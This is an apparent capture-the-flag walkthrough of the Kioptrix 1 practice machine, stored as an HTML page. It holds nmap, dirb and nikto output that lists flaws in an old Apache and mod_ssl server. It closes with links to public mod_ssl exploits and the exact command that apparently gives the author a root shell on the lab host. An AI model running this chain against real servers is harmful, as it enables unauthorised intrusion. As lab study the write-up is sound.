@@ -1,0 +1,166 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>kioptrix1</title>
+</head><body>Target IP: 10.0.0.24<br/>
+Attacker IP: 10.0.0.22<br/>
+<br/>
+Nmap scan report for 10.0.0.24<br/>
+Host is up (0.0025s latency).<br/>
+Not shown: 994 closed ports<br/>
+PORT   STATE SERVICE   VERSION<br/>
+22/tcp  open ssh     OpenSSH 2.9p2 (protocol 1.99)<br/>
+| ssh-hostkey: <br/>
+|  1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)<br/>
+|  1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)<br/>
+|_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)<br/>
+|_sshv1: Server supports SSHv1<br/>
+80/tcp  open http    Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br/>
+| http-methods: <br/>
+|_ Potentially risky methods: TRACE<br/>
+|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br/>
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux<br/>
+111/tcp open rpcbind   2 (RPC #100000)<br/>
+| rpcinfo: <br/>
+|  program version  port/proto service<br/>
+|  100000 2      111/tcp rpcbind<br/>
+|  100000 2      111/udp rpcbind<br/>
+|  100024 1      1024/tcp status<br/>
+|_ 100024 1      1024/udp status<br/>
+139/tcp open netbios-ssn Samba smbd (workgroup: rMYGROUP)<br/>
+443/tcp open ssl/https  Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br/>
+|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br/>
+|_http-title: 400 Bad Request<br/>
+|_ssl-date: 2018-06-13T17:33:17+00:00; +1m50s from scanner time.<br/>
+| sslv2: <br/>
+|  SSLv2 supported<br/>
+|  ciphers: <br/>
+|   SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br/>
+|   SSL2_DES_64_CBC_WITH_MD5<br/>
+|   SSL2_RC2_128_CBC_WITH_MD5<br/>
+|   SSL2_RC4_128_WITH_MD5<br/>
+|   SSL2_RC4_64_WITH_MD5<br/>
+|   SSL2_RC4_128_EXPORT40_WITH_MD5<br/>
+|_  SSL2_DES_192_EDE3_CBC_WITH_MD5<br/>
+1024/tcp open status   1 (RPC #100024)<br/>
+MAC Address: 00:0C:29:83:CC:A2 (VMware)<br/>
+Device type: general purpose<br/>
+Running: Linux 2.4.X<br/>
+OS CPE: cpe:/o:linux:linux_kernel:2.4<br/>
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)<br/>
+Network Distance: 1 hop<br/>
+<br/>
+Host script results:<br/>
+|_clock-skew: mean: 1m49s, deviation: 0s, median: 1m49s<br/>
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br/>
+|_smb2-time: Protocol negotiation failed (SMB2)<br/>
+<br/>
+<br/>
+I started running dirb and nikto on the webserver. <br/>
+<br/>
+Dirb results:<br/>
+---- Scanning URL: http://10.0.0.24/ ----<br/>
++ http://10.0.0.24/~operator (CODE:403|SIZE:273)                                                                                 <br/>
++ http://10.0.0.24/~root (CODE:403|SIZE:269)                                                                                   <br/>
++ http://10.0.0.24/cgi-bin/ (CODE:403|SIZE:272)                                                                                  <br/>
++ http://10.0.0.24/index.html (CODE:200|SIZE:2890)                                                                                <br/>
+==&gt; DIRECTORY: http://10.0.0.24/manual/                                                                                      <br/>
+==&gt; DIRECTORY: http://10.0.0.24/mrtg/                                                                                       <br/>
+==&gt; DIRECTORY: http://10.0.0.24/usage/                                                                                      <br/>
+                                                                                                         <br/>
+---- Entering directory: http://10.0.0.24/manual/ ----<br/>
+(!) WARNING: Directory IS LISTABLE. No need to scan it.            <br/>
+  (Use mode '-w' if you want to scan it anyway)<br/>
+                                                                                                         <br/>
+---- Entering directory: http://10.0.0.24/mrtg/ ----<br/>
++ http://10.0.0.24/mrtg/index.html (CODE:200|SIZE:17318)                                                                             <br/>
+                                                                                                         <br/>
+---- Entering directory: http://10.0.0.24/usage/ ----<br/>
++ http://10.0.0.24/usage/index.html (CODE:200|SIZE:3704)     <br/>
+<br/>
+Nitko:<br/>
+Nikto v2.1.6<br/>
+---------------------------------------------------------------------------<br/>
++ Target IP:     10.0.0.24<br/>
++ Target Hostname:  10.0.0.24<br/>
++ Target Port:    80<br/>
++ Start Time:     2018-06-13 13:39:15 (GMT-4)<br/>
+---------------------------------------------------------------------------<br/>
++ Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br/>
++ Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep 5 23:12:46 2001<br/>
++ The anti-clickjacking X-Frame-Options header is not present.<br/>
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br/>
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br/>
++ OSVDB-27487: Apache is vulnerable to XSS via the Expect header<br/>
++ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br/>
++ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.<br/>
++ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br/>
++ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE <br/>
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br/>
++ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.<br/>
++ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.<br/>
++ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.<br/>
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.<br/>
++ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.<br/>
++ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.<br/>
++ OSVDB-3268: /manual/: Directory indexing found.<br/>
++ OSVDB-3092: /manual/: Web server manual found.<br/>
++ OSVDB-3268: /icons/: Directory indexing found.<br/>
++ OSVDB-3233: /icons/README: Apache default file found.<br/>
++ OSVDB-3092: /test.php: This might be interesting...<br/>
++ 8327 requests: 0 error(s) and 21 item(s) reported on remote host<br/>
++ End Time:      2018-06-13 13:40:04 (GMT-4) (49 seconds)<br/>
+---------------------------------------------------------------------------<br/>
++ 1 host(s) tested<br/>
+root@kali:~# nikto --host https://10.0.0.24/<br/>
+- Nikto v2.1.6<br/>
+---------------------------------------------------------------------------<br/>
++ Target IP:     10.0.0.24<br/>
++ Target Hostname:  10.0.0.24<br/>
++ Target Port:    443<br/>
++ Start Time:     2018-06-13 13:50:30 (GMT-4)<br/>
+---------------------------------------------------------------------------<br/>
++ Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br/>
++ The anti-clickjacking X-Frame-Options header is not present.<br/>
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br/>
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br/>
++ No CGI Directories found (use '-C all' to force check all possible dirs)<br/>
++ OSVDB-27487: Apache is vulnerable to XSS via the Expect header<br/>
++ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.<br/>
++ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br/>
++ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br/>
++ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.<br/>
++ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.<br/>
++ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.<br/>
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.<br/>
++ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.<br/>
++ 7532 requests: 14 error(s) and 12 item(s) reported on remote host<br/>
++ End Time:      2018-06-13 13:51:11 (GMT-4) (41 seconds)<br/>
+---------------------------------------------------------------------------<br/>
++ 1 host(s) tested<br/>
+<br/>
+<img src="image.png"/><br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+<b>MRTG 2.9.6<br/>
+</b><br/>
+<br/>
+<img src="image 3.png"/><br/>
+<br/>
+<b>Webalizer Version 2.01</b><br/>
+<br/>
+<br/>
+<img src="image 4.png"/><br/>
+<br/>
+Didn't find much to target webalizer or mrtg.<br/>
+<br/>
+There is mod_ssl and mod_perl in the manual folder. There is an exploit for mod_ssl here: https://www.exploit-db.com/exploits/764/ Even after the modifications, it failed to compile.<br/>
+I tried this one https://github.com/ferreirasc/oscp/blob/master/xpl/openfuck.c and that also failed to compile.<br/>
+I was able to compile this one though https://github.com/gazcbm/openfuck-2017/blob/master/openfuck.c<br/>
+<br/>
+./exploit 0x6b 10.0.0.24 443 -c 40 &lt; this works. 0xba does not.<br/>
+<br/>
+That's pretty much it. The script uses this exploit https://www.exploit-db.com/exploits/3/ to get you a root shell.<br/>
+<br/>
+I checked other walkthroughs and it looks like you could have used samba exploit as well.</body></html>
